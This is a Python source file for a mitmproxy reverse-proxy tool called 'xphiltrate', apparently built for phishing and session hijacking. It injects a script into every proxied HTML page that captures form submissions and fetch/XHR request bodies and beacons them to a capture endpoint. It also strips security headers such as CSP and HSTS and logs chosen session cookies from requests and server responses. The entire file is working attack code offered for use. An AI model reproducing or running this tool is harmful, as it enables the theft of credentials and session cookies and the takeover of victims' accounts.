# mitm main reverse proxy
import argparse
import asyncio
import json
import logging
from urllib.parse import urlparse

from mitmproxy import http
from mitmproxy.options import Options
from mitmproxy.tools.dump import DumpMaster

try:
    from xphiltrate_logger import CredentialsLogger
except ImportError:
    class CredentialsLogger:
        def process_event(self, *args, **kwargs): pass

INJECTED_SCRIPT = """
<script>
(function() {
    function sendCapture(type, url, payload) {
        navigator.sendBeacon('/mitm-capture', JSON.stringify({type, url, payload}));
    }

    function hookForms() {
        document.querySelectorAll('form').forEach(form => {
            if (form._hooked) return;
            form._hooked = true;
            form.addEventListener('submit', function() {
                const data = {};
                new FormData(form).forEach((v, k) => data[k] = v);
                sendCapture('form', form.action || location.href, data);
            }, true);
        });
    }

    const _fetch = window.fetch;
    window.fetch = function(url, opts={}) {
        if (url !== '/mitm-capture' && opts.body) {
            try { sendCapture('fetch', url, JSON.parse(opts.body)); } catch(_) {}
        }
        return _fetch.apply(this, arguments);
    };

    const _open = XMLHttpRequest.prototype.open;
    const _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.open = function(m, url) {
        this._u = url;
        return _open.apply(this, arguments);
    };
    XMLHttpRequest.prototype.send = function(body) {
        if (body && this._u !== '/mitm-capture') {
            try { sendCapture('xhr', this._u, JSON.parse(body)); } catch(_) {}
        }
        return _send.apply(this, arguments);
    };

    hookForms();
    document.addEventListener('DOMContentLoaded', hookForms);
    new MutationObserver(hookForms).observe(document.documentElement, {childList:true, subtree:true});
})();
</script>
"""

class ReverseProxyAddon:
    def __init__(self, target):
        self.parsed        = urlparse(target.rstrip("/"))
        self.target_host   = self.parsed.hostname
        self.target_port   = self.parsed.port or (443 if self.parsed.scheme == "https" else 80)
        self.target_scheme = self.parsed.scheme
        self.target_origin = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.logger = CredentialsLogger()

    def request(self, flow: http.HTTPFlow):
            # Handle JS Injection Captures (from INJECTED_SCRIPT)
            if flow.request.path == "/mitm-capture":
                if flow.request.method == "POST":
                    try:
                        body = json.loads(flow.request.get_text())
                        self.logger.process_event(
                            f"JS_CAPTURE_{body.get('type', 'UNK').upper()}",
                            body.get("url", flow.request.pretty_url),
                            "POST",
                            body.get("payload", {})
                        )
                    except Exception as e:
                        logging.warning(f"Capture parse error: {e}")
                
                # Respond to the beacon immediately
                flow.response = http.Response.make(204, b"", {
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Headers": "Content-Type",
                })
                return

            # Capture Cookies based on site_mapping.json - integratiotn with xphiltrate_logger on 4/5
            target_host = flow.request.pretty_host
            if target_host in self.logger.site_specific_mappings:
                relevant_keys = self.logger.site_specific_mappings[target_host]
                captured_cookies = {}
                
                for cookie_name in relevant_keys:
                    if cookie_name in flow.request.cookies:
                        captured_cookies[cookie_name] = flow.request.cookies[cookie_name]
                
                if captured_cookies:
                    self.logger.process_event(
                        "HEADER_COOKIE_CAPTURE", 
                        flow.request.pretty_url, 
                        "COOKIE", 
                        captured_cookies
                    )

            # Reverse Proxy Forwarding Logic
            # This ensures the request actually reaches your Ngrok/Localhost site
            flow.request.host   = self.target_host
            flow.request.port   = self.target_port
            flow.request.scheme = self.target_scheme
            flow.request.headers["host"] = self.parsed.netloc

    def response(self, flow: http.HTTPFlow):
        resp = flow.response
        ct = resp.headers.get("content-type", "")

        # Strip security
        for h in ("content-security-policy", "x-frame-options", "strict-transport-security"):
            resp.headers.pop(h, None)

        # Inject Script
        if "text/html" in ct:
            try:
                text = resp.get_text(strict=False)
                if "<head>" in text:
                    text = text.replace("<head>", "<head>" + INJECTED_SCRIPT, 1)
                resp.set_text(text)
            except:
                pass

        # Capture cookies from server response - integratiotn with xphiltrate_logger on 4/5
        target_host = flow.request.pretty_host
        if target_host in self.logger.site_specific_mappings:
            target_cookies = self.logger.site_specific_mappings[target_host]
            captured_set_cookies = {}
            for cookie_name in target_cookies:
                if cookie_name in flow.response.cookies:
                    captured_set_cookies[cookie_name] = flow.response.cookies[cookie_name][0] 

            if captured_set_cookies:
                self.logger.process_event("SET_COOKIE_CAPTURE", flow.request.url, "SET-COOKIE", captured_set_cookies)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", type=int, default=8080, help="Local proxy port")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g. https://example.com)")
    args = parser.parse_args()

    # Define variables used in the banner and options
    upstream = args.target
    target = args.target

    banner = r"""
             _     _ _ _             _       
            | |   (_) | |           | |      
     __  ___ __ | |__  _| | |_ _ __ __ _| |_ ___ 
     \ \/ / '_ \| '_ \| | | __| '__/ _` | __/ _ \
      >  <| |_) | | | | | | |_| | | (_| | ||  __/
     /_/\_\ .__/|_| |_|_|_|\__|_|  \__,_|\__\___|
          | |                                    
          |_|                                    
    """
    
    print(banner)
    print(f"┌──────────────────────────────────────────┐")
    print(f"│  MITM Proxy — Capture + Session Hijack   │")
    print(f"│  Listen : http://127.0.0.1:{args.port:<14}│")
    print(f"│  Target : {upstream:<30}│")
    print(f"│  Status : [ RUNNING ]                    │")
    print(f"│  Action : Ctrl+C to stop                 │")
    print(f"└──────────────────────────────────────────┘\n")

    opts = Options(
        listen_host="127.0.0.1",
        listen_port=args.port,
        mode=[f"reverse:{upstream}"],
        ssl_insecure=True,
    )

    async def run():
        master = DumpMaster(opts, with_termlog=True, with_dumper=False)
        master.addons.add(ReverseProxyAddon(target))
        await master.run()

    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user. Shutting down...")

if __name__ == "__main__":
    main()